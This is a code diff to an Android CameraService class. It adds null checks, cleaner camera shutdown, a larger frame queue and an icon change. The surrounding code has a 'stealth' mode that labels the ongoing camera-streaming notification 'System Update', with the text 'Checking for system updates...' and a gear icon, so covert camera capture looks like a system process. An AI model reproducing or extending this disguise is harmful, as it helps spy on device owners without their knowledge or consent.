@@ -90,7 +90,7 @@ public class CameraService extends Service {
     private static volatile int streamWidth = 640;
     private static volatile int streamHeight = 480;
     private static volatile int streamQuality = 50;
-    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(10);
+    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(30);
 
     // Photo capture
     private static volatile byte[] lastCapturedPhoto = null;
@@ -201,7 +201,7 @@ public class CameraService extends Service {
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle(stealth ? "System Update" : "Camera Service")
                 .setContentText(stealth ? "Checking for system updates..." : "Camera service is active")
-                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.mipmap.ic_launcher)
+                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
@@ -674,6 +674,11 @@ public class CameraService extends Service {
     }
 
     private void createStreamingSession() {
+        if (cameraDevice == null || imageReader == null) {
+            Log.e(TAG, "cameraDevice or imageReader is null, cannot create session");
+            isStreaming = false;
+            return;
+        }
         try {
             Surface surface = imageReader.getSurface();
 
@@ -698,6 +703,11 @@ public class CameraService extends Service {
     }
 
     private void startPreview() {
+        if (cameraDevice == null) {
+            Log.e(TAG, "cameraDevice is null, cannot start preview");
+            isStreaming = false;
+            return;
+        }
         try {
             CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
             builder.addTarget(imageReader.getSurface());
@@ -821,6 +831,10 @@ public class CameraService extends Service {
         Log.d(TAG, "Closing camera resources");
         try {
             if (captureSession != null) {
+                try {
+                    captureSession.stopRepeating();
+                    captureSession.abortCaptures();
+                } catch (Exception ignored) {}
                 captureSession.close();
                 captureSession = null;
             }
@@ -832,6 +846,8 @@ public class CameraService extends Service {
                 imageReader.close();
                 imageReader = null;
             }
+            // Add a small breather for the HAL
+            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
         } catch (Exception e) {
             Log.e(TAG, "Error while closing camera", e);
         }
@@ -1229,7 +1245,7 @@ public class CameraService extends Service {
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                     .setContentTitle(stealth ? "System Update" : "Camera Service")
                     .setContentText(stealth ? "Checking for system updates..." : text)
-                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.mipmap.ic_launcher)
+                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
                     .setContentIntent(pendingIntent)
                     .setOngoing(true)
                     .setPriority(NotificationCompat.PRIORITY_LOW)
